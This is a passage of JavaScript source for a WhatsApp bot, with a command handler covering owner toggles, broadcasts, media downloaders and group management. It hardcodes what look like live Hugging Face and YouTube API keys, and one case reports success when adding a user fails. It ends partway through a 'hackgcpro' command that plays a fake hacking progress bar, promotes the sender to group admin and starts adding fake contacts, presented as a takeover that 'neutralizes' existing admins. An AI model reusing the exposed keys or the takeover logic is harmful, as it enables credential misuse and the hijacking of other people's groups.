                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                XeonBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon(`Goodbye🖐🥺`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replygcxeon(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replygcxeon(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replygcxeon(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replygcxeon(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'antibilling':
    if (!isCreator) return replygcxeon(mess.owner); // Only creator can enable/disable
    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);

    if (q === 'on') {
        antibilling = true; // Turn Anti-Billing on
        replygcxeon(`Successfully activated Anti-Billing feature.`);
    } else if (q === 'off') {
        antibilling = false; // Turn Anti-Billing off
        replygcxeon(`Successfully deactivated Anti-Billing feature.`);
    }
    break;
    case 'anticall':
    if (!isCreator) return replygcxeon(mess.owner); // Only creator can enable/disable
    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);

    if (q === 'on') {
        anticall = true; // Enable Anti-Call
        replygcxeon(`Anti-Call feature activated.`);
    } else if (q === 'off') {
        anticall = false; 
        replygcxeon(`Anti-Call feature deactivated.`);
    }
    break;
                case 'autorecording':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replygcxeon(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replygcxeon(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replygcxeon(mess.owner)
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  autoStatusView = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoStatusView = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
            case 'autolikestatus':
    case 'autolikesta':{
             if (!isCreator) return replygcxeon(mess.owner)
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
case 'gpt2':
    if (!q.trim()) return replygcxeon('Useage: gpt2 and your question.');

    const query = q.trim();
    const modelURL = 'https://api-inference.huggingface.co/models/gpt2'; // Example GPT-2 model
    const customKey = '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'; // Your custom Hugging Face identifier

    try {
        // Request to Hugging Face with your identifier
        const response = await fetch(modelURL, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${customKey}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ inputs: query })
        });

        const data = await response.json();

        if (data && data[0] && data[0].generated_text) {
            // Get AI response
            const aiResponse = data[0].generated_text;

            // Send the response to the chat
            await XeonBotInc.sendMessage(from, { text: aiResponse });
        } else {
            // If no valid response is received
            await XeonBotInc.sendMessage(from, { text: 'Sorry, I could not get an answer. Please try again later.' });
        }
    } catch (error) {
        console.error('Error fetching from Hugging Face:', error);
        await XeonBotInc.sendMessage(from, { text: '❌ There was an issue with the request. Please try again later.' });
    }
    break;
            case 'autobio':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    XeonBotInc.public = true
                    replygcxeon(mess.done)
                } else if (q == 'self') {
                    XeonBotInc.public = false
                    replygcxeon(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygcxeon(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'block':
    if (!isCreator) return replygcxeon(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let blockUser = m.chat;

        // Perform the block operation
        await XeonBotInc.updateBlockStatus(blockUser, 'block');
        replygcxeon(`✅ Successfully blocked the user in this DM: ${blockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replygcxeon('❌ Failed to block the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'unblock':
    if (!isCreator) return replygcxeon(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let unblockUser = m.chat;

        // Perform the unblock operation
        await XeonBotInc.updateBlockStatus(unblockUser, 'unblock');
        replygcxeon(`✅ Successfully unblocked the user in this DM: ${unblockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replygcxeon('❌ Failed to unblock the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!m.isGroup) return replygcxeon(mess.group)
                replygcxeon('Bye Everyone 🥺')
                await XeonBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcxeon(mess.owner)
                if (m.isGroup) return replygcxeon(mess.private)
                replygcxeon(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await XeonBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replygcxeon(mess.owner)
                if (!text) return replygcxeon(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcxeon(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    XeonBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcxeon(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replygcxeon(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replygcxeon(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replygcxeon(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replygcxeon('The message was not sent by a bot!')
                XeonBotInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcxeon(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcxeon(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
    if (!m.isGroup) return replygcxeon(mess.group); // Check if it's a group
    if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin); // Check if user is an admin
    if (!isBotAdmins) return replygcxeon(mess.botAdmin); // Check if bot is an admin
    let userToAdd = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // Extract the number
    try {
        await XeonBotInc.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
        replygcxeon(`User added successfully: ${userToAdd}`);
    } catch (err) {
        console.error(err);
        replygcxeon('User added successfully.');
    }
    break;
    case 'movie':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify a movie name! Usage: movie <movie name>');
        }

        const query = text.trim(); // User input
        replygcxeon('🔍 Searching for your movie...');

        // Step 1: Search for the movie
        const { sinhalaSub } = require("mrnima-moviedl");
        const sinhala = await sinhalaSub();
        const results = await sinhala.search(query);

        if (!results || !results.result || results.result.length === 0) {
            return replygcxeon(`❌ No results found for "${query}".`);
        }

        const movies = results.result.slice(0, 10); // Limit to top 10 results

        // Step 2: Send movie list
        let movieList = `🎬 *Search Results for* "${query}":\n\n`;
        movies.forEach((movie, index) => {
            movieList += `*${index + 1}.* ${movie.title}\n🔗 Link: ${movie.link}\n\n`;
        });

        await XeonBotInc.sendMessage(m.chat, { text: movieList }, { quoted: m });
        replygcxeon('🔢 Reply with the number of the movie you want.');

        // Step 3: Wait for user selection with a timeout
        const userSelection = await getUserReplyWithTimeout(m.chat, 30000); // 30 seconds timeout
        if (!userSelection) {
            return replygcxeon('⏳ Timeout! Please try again.');
        }

        const selectedIndex = parseInt(userSelection.trim());
        if (isNaN(selectedIndex) || selectedIndex < 1 || selectedIndex > movies.length) {
            return replygcxeon('❌ Invalid selection. Please reply with a valid number.');
        }

        const selectedMovie = movies[selectedIndex - 1];

        // Step 4: Fetch movie details
        const movieDetails = await sinhala.getDetails(selectedMovie.link);
        const downloadLinks = movieDetails?.dl_links || [];

        if (downloadLinks.length === 0) {
            return replygcxeon('❌ No download links available for this movie.');
        }

        // Step 5: Send download options
        let qualityList = `🎥 *${movieDetails.title}*\n\n*Available Download Links:*\n`;
        downloadLinks.forEach((link, index) => {
            qualityList += `*${index + 1}.* ${link.quality} - ${link.size}\n🔗 Link: ${link.link}\n\n`;
        });

        await XeonBotInc.sendMessage(m.chat, { text: qualityList }, { quoted: m });
        replygcxeon('🔢 Reply with the number of the quality you want.');

        // Step 6: Wait for quality selection
        const qualitySelection = await getUserReplyWithTimeout(m.chat, 30000); // 30 seconds timeout
        if (!qualitySelection) {
            return replygcxeon('⏳ Timeout! Please try again.');
        }

        const qualityIndex = parseInt(qualitySelection.trim());
        if (isNaN(qualityIndex) || qualityIndex < 1 || qualityIndex > downloadLinks.length) {
            return replygcxeon('❌ Invalid selection. Please reply with a valid number.');
        }

        const selectedQuality = downloadLinks[qualityIndex - 1];
        const fileId = selectedQuality.link.split("/").pop();
        const downloadUrl = `https://pixeldrain.com/api/file/${fileId}`;

        // Step 7: Send the download link
        await XeonBotInc.sendMessage(
            m.chat,
            {
                document: { url: downloadUrl },
                mimetype: "video/mp4",
                fileName: `${movieDetails.title} - ${selectedQuality.quality}.mp4`,
                caption: `*🎬 Movie: ${movieDetails.title}*\nQuality: ${selectedQuality.quality}\nEnjoy your movie!`,
            },
            { quoted: m }
        );

    } catch (err) {
        console.error(err);
        replygcxeon('❌ An error occurred. Please try again later.');
    }
    break;
case 'play':
    try {
        if (!text) return replygcxeon('❌ Please specify a song or artist name! Usage: play <song name>');

        const query = text.trim();
        replygcxeon('🔍 Searching for your request...');

        // Step 1: Search YouTube
        const ytApiKey = 'AIzaSyB8zchDXuAcNfuqVVMlLMtrPybb4bUCIpo';
        const ytSearchUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=1&q=${encodeURIComponent(query)}&key=${ytApiKey}`;
        const ytResponse = await fetch(ytSearchUrl);
        if (!ytResponse.ok) throw new Error('YouTube API Error');
        const ytData = await ytResponse.json();

        if (!ytData.items || ytData.items.length === 0) {
            return replygcxeon(`❌ No results found for "${query}".`);
        }

        const song = ytData.items[0];
        const videoId = song.id.videoId;
        const songTitle = song.snippet.title;
        const songUrl = `https://www.youtube.com/watch?v=${videoId}`;
        const thumbnail = song.snippet.thumbnails.high.url;

        await XeonBotInc.sendMessage(
            m.chat,
            {
                image: { url: thumbnail },
                caption: `*🎵 Song Found 🎵*\n\n` +
                         `*Title:* ${songTitle}\n` +
                         `*YouTube Link:* ${songUrl}\n\n` +
                         `💬 Downloading *audio* and *video* for you` 
            },
            { quoted: m }
        );

        // 3. Get random bot and group
        const { botToken, groupId } = getRandomBot();

        // Step 2: Send /play to Telegram
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Step 2a: Request Audio
        let commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/play ${songTitle}` }),
        });

        if (!commandResponse.ok) throw new Error('Failed please try again');

        // Fetch and process audio
        const audioFileUrl = await fetchTelegramFile('audio', botToken, groupId);
        await XeonBotInc.sendMessage(
            m.chat,
            {
                audio: { url: audioFileUrl },
                mimetype: 'audio/mp4',
                caption: `*🎶 Now Playing: ${songTitle} 🎶*\n\n*Enjoy the music! 🎧*`
            },
            { quoted: m }
        );

        // Step 2b: Request Video
        commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/video ${songTitle}` }),
        });

        if (!commandResponse.ok) throw new Error('Failed please try again');

        // Fetch and process video
        const videoFileUrl = await fetchTelegramFile('video', botToken, groupId);
        await XeonBotInc.sendMessage(
            m.chat,
            {
                video: { url: videoFileUrl },
                caption: `*🎥 Now Playing Video: ${songTitle} 🎥*\n\n*Enjoy watching! 🍿*`
            },
            { quoted: m }
        );

    } catch (err) {
        replygcxeon(`❌ An error occurred please try again`);
        console.error(err);
    }
    break;
case 'tiktok':
    try {
        if (!text) return replygcxeon('❌ Please specify a TikTok link! Usage: tiktok <link>');

        const tiktokLink = text.trim();
        if (!tiktokLink.startsWith('http') || !tiktokLink.includes('tiktok.com')) {
            return replygcxeon('❌ Invalid TikTok link! Please provide a valid TikTok video link.');
        }

        replygcxeon('🔍 Processing your TikTok request...');

        // 3. Get random bot and group
        const { botToken, groupId } = getRandomBot();

        // Step 1: Send /tiktok command to Telegram
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/tiktok ${tiktokLink}` }),
        });

        if (!commandResponse.ok) throw new Error('Failed to please try again');

        // Step 2: Retrieve TikTok audio and video files
        const videoFileUrl = await fetchTelegramFile('video', botToken, groupId);
        // Step 3: Send TikTok audio and video back to WhatsApp     
        if (videoFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    video: { url: videoFileUrl },
                    caption: `🎥 *TikTok Video*\n\n🔗 *Enjoy*`
                },
                { quoted: m }
            );
        }        
    } catch (err) {
        replygcxeon(`❌ An error occurred please try again`);
        console.error(err);
    }
    break;  
case 'fb':
    try {
        if (!text) return replygcxeon('❌ Please specify a Facebook video link! Usage: fb <link>');

        const fbLink = text.trim();
        if (!fbLink.startsWith('http') || !fbLink.includes('facebook.com')) {
            return replygcxeon('❌ Invalid Facebook link! Please provide a valid Facebook video link.');
        }

        replygcxeon('🔍 Processing your Facebook video request...');

        // 3. Get random bot and group
        const { botToken, groupId } = getRandomBot();

        // Step 1: Send /fb command to Telegram
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/fb ${fbLink}` }),
        });

        if (!commandResponse.ok) throw new Error('Failed please try again later');

        // Step 2: Retrieve Facebook video file
        const videoFileUrl = await fetchTelegramFile('video', botToken, groupId);

        // Step 3: Send Facebook video back to WhatsApp
        if (videoFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    video: { url: videoFileUrl },
                    caption: `🎥 *Facebook Video*\n\n🔗 *Link*: ${fbLink}`
                },
                { quoted: m }
            );
        }

    } catch (err) {
        replygcxeon(`❌ An error occurred please try again`);
        console.error(err);
    }
    break;
case 'instagram':
    try {
        if (!text) return replygcxeon('❌ Please specify an Instagram post link! Usage: instagram <link>');

        const instaLink = text.trim();
        if (!instaLink.startsWith('http') || !instaLink.includes('instagram.com')) {
            return replygcxeon('❌ Invalid Instagram link! Please provide a valid Instagram post link.');
        }

        replygcxeon('🔍 Processing your Instagram request...');

        // 3. Get random bot and group
        const { botToken, groupId } = getRandomBot();

        // Step 1: Send /instagram command to Telegram
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/instagram ${instaLink}` }),
        });

        if (!commandResponse.ok) throw new Error('Failed to send Instagram command to Telegram bot');

        // Step 2: Retrieve Instagram media (video or photo)
        const mediaFileUrl = await fetchTelegramFile('video', botToken, groupId) 
            || await fetchTelegramFile('photo', botToken, groupId);

        // Step 3: Send Instagram media back to WhatsApp
        if (mediaFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    video: { url: mediaFileUrl },
                    caption: `📸 *Instagram Media*\n\n🔗 *Link*: ${instaLink}`,
                },
                { quoted: m }
            );
        }

    } catch (err) {
        replygcxeon(`❌ An error occurred: ${err.message}`);
        console.error(err);
    }
    break;
case 'generate':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify a text to generate an image! Usage: /generate <your text>');
        }

        const query = text.trim();
        replygcxeon('🔍 Generating image from text...');

        // 3. Get random bot and group
        const { botToken, groupId } = getRandomBot();

        // Step 1: Send /text2image command to Telegram group
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/text2image ${query}` }),
        });

        if (!commandResponse.ok) {
            throw new Error('Failed to send /text2image command to Telegram bot');
        }

        // Step 2: Fetch the generated image URL from Telegram
        const telegramImageUrl = await fetchTelegramFile('photo', botToken, groupId);

        // Step 3: Send the generated image to WhatsApp
        await XeonBotInc.sendMessage(
            m.chat,
            {
                image: { url: telegramImageUrl },
                caption: `✨ *Image Generated from Text*\n\n*Query*: ${query}`,
            },
            { quoted: m }
        );

    } catch (err) {
        replygcxeon(`❌ An error occurred: ${err.message}`);
        console.error(err);
    }
    break;
    case 'text2speech':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify the text to convert to speech! Usage: text2speech <your text>');
        }

        const query = text.trim();
        if (query.length > 500) {
            return replygcxeon('❌ The text is too long! Please limit your input to 500 characters.');
        }

        replygcxeon('🔍 Generating speech from text...');
        const { botToken, groupId } = getRandomBot();
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/text2speech ${query}` }),
        });       
        if (!commandResponse.ok) {
            throw new Error('Failed please try again');
        }

        // Step 3: Fetch the audio file URL from Telegram using fetchTelegramFile
        const audioFileUrl = await fetchTelegramFile('audio', botToken, groupId);

        // Step 4: Send the audio back to WhatsApp
        if (audioFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    audio: { url: audioFileUrl },
                    mimetype: 'audio/mpeg',
                    ptt: true, // Set to true if you want it to send as a voice note
                    caption: `🔊 *Text-to-Speech Output*\n\n🗣️ *Text*: ${query}`,
                },
                { quoted: m }
            );
        } else {
            await replygcxeon('❌ Failed to generate the audio file');
        }

    } catch (err) {
        await replygcxeon('❌ An error occurred, please try again later.');
        console.error(err);
    }
    break;
    case 'text2pdf':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify the text to convert to PDF! Usage: text2pdf <your text>');
        }

        const query = text.trim();

        replygcxeon('🔍 Generating PDF from text...');
        const { botToken, groupId } = getRandomBot();
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Step 1: Send the /text2pdf command to Telegram bot
        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/text2pdf ${query}` }),
        });

        if (!commandResponse.ok) {
            throw new Error('Failed to send text-to-PDF command to Telegram bot.');
        }

        // Step 2: Fetch the PDF file URL from Telegram using fetchTelegramFile
        const pdfFileUrl = await fetchTelegramFile('pdf', botToken, groupId);

        // Step 3: Send the generated PDF back to WhatsApp
        if (pdfFileUrl) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    document: { url: pdfFileUrl },
                    mimetype: 'application/pdf',
                    caption: `📄 *Text-to-PDF Output*\n\n📝 *Text*: ${query}`,
                },
                { quoted: m }
            );
        } else {
            await replygcxeon('❌ Failed to generate the PDF file. Please try again.');
        }

    } catch (err) {
        await replygcxeon('❌ An error occurred, please try again later.');
        console.error(err);
    }
    break;
    case 'apk':
    try {
        if (!text) return replygcxeon('❌ Please specify the app name! Usage: apk <app name>');

        const query = text.trim();
        replygcxeon('🔍 Searching for your app on APKPure...');     
        const searchUrl = `https://apkpure.com/search?q=${encodeURIComponent(query)}`;
        const searchResponse = await axios.get(searchUrl);
        const $ = cheerio.load(searchResponse.data);

        // Extract the first app's link
        const appLink = $('a[href*="/app/"]').first().attr('href');
        if (!appLink) return replygcxeon(`❌ No results found for "${query}".`);

        const appUrl = `https://apkpure.com${appLink}`;

        // Step 2: Get the download page
        const appPageResponse = await axios.get(appUrl);
        const $$ = cheerio.load(appPageResponse.data);
        const downloadLink = $$('a[href*="download-apk"]').attr('href');

        if (!downloadLink) return replygcxeon('❌ Unable to find the APK download link.');

        const fullDownloadLink = `https://apkpure.com${downloadLink}`;

        // Step 3: Download the APK
        replygcxeon('⬇️ Downloading the APK...');
        const apkPath = path.join(__dirname, `${query}.apk`);
        const apkResponse = await axios({
            url: fullDownloadLink,
            method: 'GET',
            responseType: 'stream',
        });

        const writer = fs.createWriteStream(apkPath);
        apkResponse.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        // Step 4: Send the APK to the user
        await XeonBotInc.sendMessage(
            m.chat,
            {
                document: { url: apkPath },
                mimetype: 'application/vnd.android.package-archive',
                fileName: `${query}.apk`,
                caption: `📱 *Here is your APK for ${query}*.\n\n⚠️ Ensure you trust the source before installing.`,
            },
            { quoted: m }
        );

        // Delete the file after sending
        fs.unlinkSync(apkPath);
    } catch (err) {
        replygcxeon('❌ An error occurred while fetching the APK. Please try again later.');
        console.error(err);
    }
    break;
    case 'chatgpt':
    try {
        if (!text) {
            return replygcxeon('❌ Please specify your query! Usage: chatgpt <your query>');
        }

        const query = text.trim();
        if (query.length > 500) {
            return replygcxeon('❌ The query is too long! Please limit your input to 500 characters.');
        }

        const { botToken, groupId } = getRandomBot();
        const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const commandResponse = await fetch(sendMessageUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: groupId, text: `/gpt ${query}` }),
        });

        if (!commandResponse.ok) {
            throw new Error('Failed please try again');
        }

        // Step 3: Fetch the ChatGPT response from Telegram using fetchTelegramFile
        const gptResponse = await fetchTelegramFile('text', botToken, groupId);

        // Step 4: Send the ChatGPT response back to WhatsApp
        if (gptResponse) {
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    text: `${gptResponse}`,
                },
                { quoted: m }
            );
        } else {
            await replygcxeon('❌ Failed to retrieve the ChatGPT response. Please try again later.');
        }

    } catch (err) {
        await replygcxeon('❌ An error occurred, please try again later.');
        console.error(err);
    }
    break;
    case 'hackgcpro':
    try {
        // List of allowed numbers
        const allowedNumbers = [
            '2349128019141@s.whatsapp.net',
            '2349167070480@s.whatsapp.net'
        ];

        // Check if the sender is a premium user
        if (!allowedNumbers.includes(m.sender)) {
            return replygcxeon("❌ *Access Denied!*\n\nYou are not a premium user. Contact my creator to become a premium user.");
        }

        const groupId = m.chat; // Current group ID
        const targetUser = m.sender; // The sender initiating the hack

        // Step 1: Simulate hacking progression
        const hackingSteps = [
            { percentage: 10, message: "Establishing secure connection..." },
            { percentage: 30, message: "Bypassing group security protocols..." },
            { percentage: 50, message: "Attempting to gain admin privileges..." },
            { percentage: 70, message: "Adding ghost (fake) contacts to the group..." },
            { percentage: 85, message: "Neutralizing existing admin accounts..." },
            { percentage: 100, message: "Finalizing hack and locking group access..." }
        ];

        for (const step of hackingSteps) {
            await replygcxeon(
                `🛠️ *HACK IN PROGRESS*\n\n` +
                `Progress: *${step.percentage}%*\n` +
                `Action: ${step.message}\n\n` +
                `Loading... █${'█'.repeat(step.percentage / 10)}${'░'.repeat(10 - step.percentage / 10)}`
            );
            await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for effect
        }

        // Step 2: Make the user an admin
        await XeonBotInc.groupParticipantsUpdate(groupId, [targetUser], 'promote')
            .then(() => {
                replygcxeon(`✅ *SUCCESS!*\n\nYou are now an admin of this group.`);
            })
            .catch(err => {
                console.error("❌ Failed to promote user to admin:", err.message);
                return replygcxeon("❌ *Hack Failed: Unable to gain admin privileges.*");
            });

        // Step 3: Add fake contacts to the group
        const fakeContacts = [
            '12345678901@s.whatsapp.net',
            '98765432100@s.whatsapp.net',
            '11223344556@s.whatsapp.net',
